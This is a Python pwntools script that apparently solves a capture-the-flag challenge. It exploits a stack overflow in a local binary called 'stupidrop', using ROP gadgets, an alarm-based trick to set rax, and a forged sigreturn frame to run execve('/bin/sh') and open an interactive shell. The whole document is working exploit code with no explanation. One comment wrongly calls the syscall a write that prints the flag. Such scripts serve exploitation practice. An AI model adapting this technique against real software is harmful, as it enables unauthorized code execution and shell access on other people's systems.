from pwn import *

target = process('./stupidrop')
elf = ELF('stupidrop')
# gdb.attach(target, gdbscript='b *0x00400637')

# Specify the architecture
context.arch = 'amd64'

# gadgets
pop_rdi = p64(0x4006a3)
syscall_addr = p64(0x40063e)

# useful methods
gets_addr = p64(elf.symbols['gets'])
alarm_addr = p64(elf.symbols['alarm'])

# other miscs
binsh_addr = p64(0x00601050)

# stack frame
frame = SigreturnFrame()

# set return pointer to a syscall
frame.rip = 0x40063e

# set the values to trigger a write syscall that will print the flag
frame.rax = 0x3b
frame.rdi = 0x00601050
frame.rsi = 0x0
frame.rdx = 0x0

##### prepare the payload

# padding
payload = b'\x00' * 0x38

# write /bin/sh by user
payload += pop_rdi
payload += binsh_addr
payload += gets_addr

# set alarm twice to set rax to 0xf
payload += pop_rdi
payload += p64(0xf)
payload += alarm_addr
payload += pop_rdi
payload += p64(0x0)
payload += alarm_addr

# do the syscall with the stack context
payload += syscall_addr
payload += bytes(frame)

target.sendline(payload)
target.sendline('/bin/sh')
target.interactive()
